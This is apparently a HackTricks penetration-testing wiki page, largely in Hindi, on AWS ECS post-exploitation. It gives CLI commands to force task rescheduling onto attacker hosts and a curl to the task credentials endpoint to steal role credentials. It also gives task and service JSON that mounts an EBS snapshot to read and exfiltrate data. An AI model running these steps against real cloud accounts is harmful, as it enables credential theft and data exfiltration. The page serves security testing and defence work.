# AWS - ECS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

For more information check:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### Host IAM Roles

In ECS an **IAM role को task को असाइन किया जा सकता है** जो container के अंदर चल रहा होता है। **If** वह task किसी **EC2** instance के अंदर चलाया गया है, तो उस **EC2 instance** के साथ **another IAM** role जुड़ा होगा।\
जिसका मतलब है कि अगर आप किसी ECS instance को **compromise** कर लेते हैं तो आप सम्भवत: **ECR और EC2 instance से जुड़े IAM role** प्राप्त कर सकते हैं। उन credentials को कैसे प्राप्त करें इसके लिए देखें:

{{#ref}}
https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html
{{#endref}}

> [!CAUTION]
> IMDSv2 with a hop limit of 1 **does not** awsvpc या host-networked tasks को block करता—केवल Docker bridge tasks इतनी दूरी पर होते हैं कि responses समाप्त हो जाती हैं। See [ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation](../aws-ec2-ebs-ssm-and-vpc-post-exploitation/README.md#ecs-on-ec2-imds-abuse--ecs-agent-impersonation) for the full attack workflow and bypass notes. Recent [Latacora research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/) shows that awsvpc and host tasks still fetch host credentials even when IMDSv2+h=1 is enforced.

### Privesc to node to steal other containers creds & secrets

इसके अलावा, EC2 docker का उपयोग ECs tasks चलाने के लिए करता है, इसलिए अगर आप node तक escape कर पाते हैं या **docker socket को access** कर लेते हैं, तो आप यह **check** कर सकते हैं कि कौन से **अन्य containers** चल रहे हैं, और उनमें **अंदर जाकर** उनके जुड़े हुए **IAM roles** चुरा भी सकते हैं।

#### Making containers run in current host

अतिरिक्त रूप से, **EC2 instance role** के पास आमतौर पर पर्याप्त **permissions** होते हैं ताकि cluster के अंदर node के रूप में उपयोग हो रहे EC2 instances की **container instance state** को **update** किया जा सके। एक attacker किसी instance की **state** को **DRAINING** में बदल सकता है, तब ECS उस instance से सभी tasks को **remove** कर देगा और जो tasks **REPLICA** के रूप में चल रहे थे वे किसी दूसरे instance पर चलेंगे, संभवतः attacker के instance पर, ताकि वह उनके जुड़े IAM roles और container के अंदर की संवेदनशील जानकारी चुरा सके।
```bash
aws ecs update-container-instances-state \
--cluster <cluster> --status DRAINING --container-instances <container-instance-id>
```
इसी तकनीक को **deregistering the EC2 instance from the cluster** करके किया जा सकता है। यह संभावित रूप से कम छिपा हुआ होगा लेकिन यह **force the tasks to be run in other instances:**
```bash
aws ecs deregister-container-instance \
--cluster <cluster> --container-instance <container-instance-id> --force
```
tasks के पुनः निष्पादन को मजबूर करने की एक अंतिम तकनीक यह है कि ECS को संकेत दिया जाए कि **task or container was stopped**। इसके लिए 3 संभावित APIs हैं:
```bash
# Needs: ecs:SubmitTaskStateChange
aws ecs submit-task-state-change --cluster <value> \
--status STOPPED --reason "anything" --containers [...]

# Needs: ecs:SubmitContainerStateChange
aws ecs submit-container-state-change ...

# Needs: ecs:SubmitAttachmentStateChanges
aws ecs submit-attachment-state-changes ...
```
#### क्लस्टर में एक हमलावर होस्ट के साथ जुड़ें (Register Container Instance)

एक अन्य विकल्प (draining की तुलना में अधिक सीधे) यह है कि आप क्लस्टर में **अपनी नियंत्रित क्षमता जोड़ें** — एक EC2 instance को container instance के रूप में register करके (`ecs:RegisterContainerInstance`) और आवश्यक container instance attributes सेट करके ताकि placement constraints मिल जाएँ। जब tasks आपके होस्ट पर आ जाएँ, तो आप containers में inspect/exec कर सकते हैं और `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` credentials निकाल सकते हैं।

ECS privesc पेज पर `ecs:RegisterContainerInstance` सेक्शन देखें ताकि पूरा workflow समझ में आ सके।

### Steal sensitive info from ECR containers

EC2 instance के पास संभवतः `ecr:GetAuthorizationToken` permission भी होगा जो इसे **images डाउनलोड करने** की अनुमति देता है (आप उनमें संवेदनशील जानकारी खोज सकते हैं)।

### Steal Task Role Credentials via `ecs:ExecuteCommand`

यदि `ExecuteCommand` किसी task पर सक्षम है, तो `ecs:ExecuteCommand` + `ecs:DescribeTasks` रखने वाला principal चल रहे container के अंदर shell खोल सकता है और फिर **task credentials endpoint** को query करके **task role** credentials निकाल सकता है:

- From inside the container: `curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"`
- Use the returned `AccessKeyId/SecretAccessKey/Token` to call AWS APIs as the task role

ECS privilege escalation पेज देखें for enumeration and command examples.

### Mount an EBS snapshot directly in an ECS task (configuredAtLaunch + volumeConfigurations)

native ECS EBS integration (2024+) का दुरुपयोग करके किसी मौजूदा EBS snapshot की सामग्री को सीधे एक नए ECS task/service के अंदर mount करें और container के अंदर से उसका डेटा पढ़ें।

- आवश्यकताएँ (न्यूनतम):
- ecs:RegisterTaskDefinition
- One of: ecs:RunTask OR ecs:CreateService/ecs:UpdateService
- iam:PassRole on:
- ECS infrastructure role used for volumes (policy: `service-role/AmazonECSInfrastructureRolePolicyForVolumes`)
- Task execution/Task roles referenced by the task definition
- If the snapshot is encrypted with a CMK: KMS permissions for the infra role (the AWS managed policy above includes the required KMS grants for AWS managed keys).

- प्रभाव: container के अंदर snapshot से किसी भी डिस्क सामग्री (उदा., database files) पढ़ना और नेटवर्क/लॉग्स के माध्यम से बाहर निकालना।

Steps (Fargate example):

1) Create the ECS infrastructure role (if it doesn’t exist) and attach the managed policy:
```bash
aws iam create-role --role-name ecsInfrastructureRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsInfrastructureRole \
--policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSInfrastructureRolePolicyForVolumes
```
2) एक task definition रजिस्टर करें जिसमें एक volume `configuredAtLaunch` के रूप में चिह्नित हो और उसे container में mount करें। उदाहरण (secret को प्रिंट करके फिर sleep करता है):
```json
{
"family": "ht-ebs-read",
"networkMode": "awsvpc",
"requiresCompatibilities": ["FARGATE"],
"cpu": "256",
"memory": "512",
"executionRoleArn": "arn:aws:iam::<ACCOUNT_ID>:role/ecsTaskExecutionRole",
"containerDefinitions": [
{"name":"reader","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["cat /loot/secret.txt || true; sleep 3600"],
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/ebs","awslogs-stream-prefix":"reader"}},
"mountPoints":[{"sourceVolume":"loot","containerPath":"/loot","readOnly":true}]
}
],
"volumes": [ {"name":"loot", "configuredAtLaunch": true} ]
}
```
3) EBS snapshot को `volumeConfigurations.managedEBSVolume` के जरिए पास करके एक service बनाएं या अपडेट करें (इन्फ्रा रोल पर iam:PassRole की आवश्यकता)। उदाहरण:
```json
{
"cluster": "ht-ecs-ebs",
"serviceName": "ht-ebs-svc",
"taskDefinition": "ht-ebs-read",
"desiredCount": 1,
"launchType": "FARGATE",
"networkConfiguration": {"awsvpcConfiguration":{"assignPublicIp":"ENABLED","subnets":["subnet-xxxxxxxx"],"securityGroups":["sg-xxxxxxxx"]}},
"volumeConfigurations": [
{"name":"loot","managedEBSVolume": {"roleArn":"arn:aws:iam::<ACCOUNT_ID>:role/ecsInfrastructureRole", "snapshotId":"snap-xxxxxxxx", "filesystemType":"ext4"}}
]
}
```
4) जब task शुरू होता है, container कॉन्फ़िगर किए गए mount path (उदा., `/loot`) पर snapshot की सामग्री पढ़ सकता है। Exfiltrate करें task के network/logs के माध्यम से।

सफाई:
```bash
aws ecs update-service --cluster ht-ecs-ebs --service ht-ebs-svc --desired-count 0
aws ecs delete-service --cluster ht-ecs-ebs --service ht-ebs-svc --force
aws ecs deregister-task-definition ht-ebs-read
```
## संदर्भ

- [Latacora - ECS on EC2: IMDS Hardening में अंतर को भरना](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)

{{#include ../../../../banners/hacktricks-training.md}}
